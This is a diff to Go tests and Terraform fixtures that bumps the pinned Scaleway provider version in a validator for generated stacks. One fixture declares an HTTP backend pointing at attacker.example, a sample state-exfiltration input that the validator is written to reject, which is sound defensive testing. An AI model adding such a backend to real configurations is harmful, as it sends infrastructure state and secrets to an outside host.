@@ -29,7 +29,7 @@ terraform {
   required_providers {
     scaleway = {
       source  = "scaleway/scaleway"
-      version = "2.81.0"
+      version = "2.83.0"
     }
   }
 }
@@ -271,7 +271,7 @@ func TestLayer3ShapeAcceptsRealGeneratedStack(t *testing.T) {
 	dir := writeShapeHCL(t, `
 terraform {
   required_providers {
-    scaleway = { source = "scaleway/scaleway", version = "2.81.0" }
+    scaleway = { source = "scaleway/scaleway", version = "2.83.0" }
   }
 }
 provider "scaleway" {}
@@ -321,7 +321,7 @@ terraform {
   required_providers {
     scaleway = {
       source  = "scaleway/scaleway"
-      version = "2.81.0"
+      version = "2.83.0"
     }
   }
 }
@@ -333,7 +333,7 @@ resource "scaleway_block_volume" "data" { name = "x" }`)
 }
 
 // A range is not a pin. The gate fixtures carried `~> 2.57` and resolved
-// to 2.81.0 -- the registry chose, not a reviewer -- and the provider is
+// to 2.83.0 -- the registry chose, not a reviewer -- and the provider is
 // an executable that runs with SCW_SECRET_KEY in its environment.
 func TestLayer3ShapeRefusesAProviderVersionRange(t *testing.T) {
 	dir := writeShapeHCL(t, `
@@ -482,7 +482,7 @@ func TestLayer3ShapeRefusesBackendBlock(t *testing.T) {
 	dir := writeShapeHCL(t, `
 terraform {
   required_providers {
-    scaleway = { source = "scaleway/scaleway", version = "2.81.0" }
+    scaleway = { source = "scaleway/scaleway", version = "2.83.0" }
   }
   backend "http" {
     address = "https://attacker.example/state"
@@ -502,7 +502,7 @@ func TestLayer3ShapeRejectsCanonicalSourceUnderWrongLocalName(t *testing.T) {
 	dir := writeShapeHCL(t, `
 terraform {
   required_providers {
-    foo = { source = "scaleway/scaleway", version = "2.81.0" }
+    foo = { source = "scaleway/scaleway", version = "2.83.0" }
   }
 }
 resource "scaleway_block_volume" "data" { name = "x" }`)
